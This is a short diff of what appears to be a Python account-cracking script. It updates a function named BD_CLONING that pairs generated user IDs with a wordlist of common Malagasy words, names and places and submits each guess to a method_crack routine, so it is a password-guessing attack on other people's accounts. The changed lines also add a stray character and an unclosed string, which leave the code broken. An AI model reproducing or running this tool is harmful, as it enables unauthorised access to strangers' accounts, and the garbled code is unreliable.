@@ -1,4 +1,4 @@
-# Définir le numéro de version
+î# Définir le numéro de version
 version_actuelle = "2.0"
 
 
@@ -116,7 +116,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:], 'fanantenana','Fanantenana','rakoto','Rakoto','mamiko','Mamiko','Mamako','mamako','Robert','robert','Mandresy','mandresy','Jean','jean','matory','Matory','fanasina','Fanasina','Babakoto','babakoto', 'randria', 'Randria', 'Malala', 'malala', 'Malalako', 'malalako', 'nomena', 'Nomena', 'Rakotoarimanana', 'rakotoarimanana', 'madama','Madama','Malagasy','malagasy','Pizza','Fianarana','fianarana','mamiko','Mamiko','nirina','Nirina','Nosy','nosy','mahamasina','Mahamasina','Fanantenana', 'fitiavana', 'Fitiavana', 'nirina', 'Nirina', 'frite', 'Frite', 'faneva', 'fanafody', 'Fanafody', 'nomenjanahary', 'Nomenjanahary', 'sambatra', 'Sambatra', 'Barbie', 'barbie', 'mijery', 'Mijery', 'nantenaina', 'Nantenaina', 'mofo akondro', 'varotra', 'Varotra', 'anjara', 'Anjara', 'maman', 'Maman', 'Ankatso', 'ankatso', 'fandresena', 'Fandresena', 'Mofo akondro', 'cntemad', 'CNTEMAD', 'Ambodivona', 'njaka', 'antananarivo', 'Antananarivo', 'malagasy', 'Malagasy', 'rabe', 'Shoprite', 'shoprite', 'Karoty', 'Koloina', 'koloina' , 'karoty']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:], 'fanantenana','Fanantenana','rakoto','Rakoto','mamiko','Mamiko','Mamako','mamako','mpanety','Mpanety','vadiko','Vadiko','fory','Fory','matory','Matory','vola','Vola','koto','Koto', 'randria', 'Randria', 'Malala', 'malala', 'Malalako', 'malalako', 'nomena', 'Nomena', 'Rakotoarimanana', 'rakotoarimanana', 'Tiako','tiako','Malagasy','malagasy','kiraro','Kiraro','akanjo','mamiko','Mamiko','Akanjo','Nirina','Nounours','nounours','mahamasina','Mahamasina','Fanantenana', 'fitiavana', 'Fitiavana', 'nirina', 'chocolat', 'Chocolat', 'Frite', 'faneva', 'ambatobe', 'Ambatobe', 'nomenjanahary', 'Nomenjanahary', 'sambatra', 'Sambatra', 'antsa', 'Antsa, 'mitsiky', 'Mitsiky', 'nantenaina', 'Nantenaina', 'Madagasikara', 'madagasikara', 'anjara', 'Anjara', 'maman', 'Maman', 'Ankatso', 'ankatso', 'fandresena', 'Fandresena', 'Mofo akondro', 'cntemad', 'CNTEMAD', 'Ambodivona', 'njaka', 'antananarivo', 'Antananarivo', 'malagasy', 'Malagasy', 'Andriamanantena', 'andriamanantena', 'sitraka', 'Sitraka', 'Koloina', 'koloina' , 'karoty']
             Dipto.submit(method_crack,ids,passlist)
             
     linex()
